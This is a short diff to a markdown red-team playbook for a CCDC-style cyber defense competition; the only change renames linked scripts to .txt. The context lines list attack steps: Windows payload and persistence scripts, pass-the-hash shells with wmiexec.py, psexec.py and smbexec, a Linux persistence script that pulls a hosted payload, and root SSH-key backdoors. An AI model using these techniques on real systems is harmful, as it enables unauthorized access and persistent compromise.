@@ -22,8 +22,8 @@ pagetitle: Red Teaming for CCDC
 
 **Windows:**
 - When installing the exes, make sure to use `-o` with `iwr` or we'll just get the HTTP connection info lmfao
-- First, run [windows_add_payloads.ps1](https://khaelkugler.com/scripts/windows_add_payloads.ps1) to add the file to each of the locations
-- Then, run [windows_persistence.ps1](https://khaelkugler.com/scripts/windows_persistence.ps1)
+- First, run [windows_add_payloads.ps1](https://khaelkugler.com/scripts/windows_add_payloads.ps1.txt) to add the file to each of the locations
+- Then, run [windows_persistence.ps1](https://khaelkugler.com/scripts/windows_persistence.ps1.txt)
 - Shells:
   - 135 - use `wmiexec.py -hashes :{hash} '{domain}/{user}@{ip}'`
   - 139/445 - use `psexec.py -hashes :{hash} '{domain}/{user}@{ip}'` or `smbexec`
@@ -34,7 +34,7 @@ pagetitle: Red Teaming for CCDC
     - `-r` optional, used for kerberos
 
 **Linux:**
-- Run [linux_persistence.sh {payload_name} {optional_absolute_path_to_payload}](https://khaelkugler.com/scripts/linux_persistence.sh) while hosting the payload
+- Run [linux_persistence.sh {payload_name} {optional_absolute_path_to_payload}](https://khaelkugler.com/scripts/linux_persistence.sh.txt) while hosting the payload
   - Make sure to point the script to the correct location to pull the file from
 - Add SSH keys
   - `mkdir /root/.ssh` and add key to `/root/.ssh/authorized_keys`
